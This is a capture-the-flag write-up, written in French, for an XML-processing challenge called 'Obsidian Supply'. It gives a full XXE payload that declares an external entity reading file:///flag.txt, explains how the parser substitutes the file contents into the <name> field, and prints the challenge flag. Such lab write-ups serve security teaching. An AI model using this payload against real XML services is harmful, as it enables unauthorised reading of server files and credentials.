# Obsidian Supply

L'application traite des manifestes en XML. La description nous apprend que le parseur est vulnérable et configuré en mode Legacy, ce qui le rend sensible aux attaques XXE (XML External Entities). Le but est de lire le fichier `/flag.txt`.

Il faut forger un document XML incluant une déclaration d'entité externe, et faire en sorte que l'application nous affiche le contenu de cette entité via la balise `<name>`.

Le payload XXE typique à soumettre ressemble à ça :
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///flag.txt" >
]>
<manifest>
    <name>&xxe;</name>
    <item>Ammo</item>
</manifest>
```

Le parseur va lire la déclaration `<!ENTITY xxe SYSTEM "file:///flag.txt">`, récupérer le contenu du fichier et le stocker dans la variable `&xxe;`. 
Ensuite, quand il arrive sur `<name>&xxe;</name>`, il va substituer la variable par le contenu du fichier.

L'interface nous renvoie ensuite les détails du manifeste traité, avec le flag à la place du nom.

**Flag:** `HTS{XXE_P4rs3r_1s_Vuln3r4bl3_T0_Ext3rn4l_Ent1t13s}`
 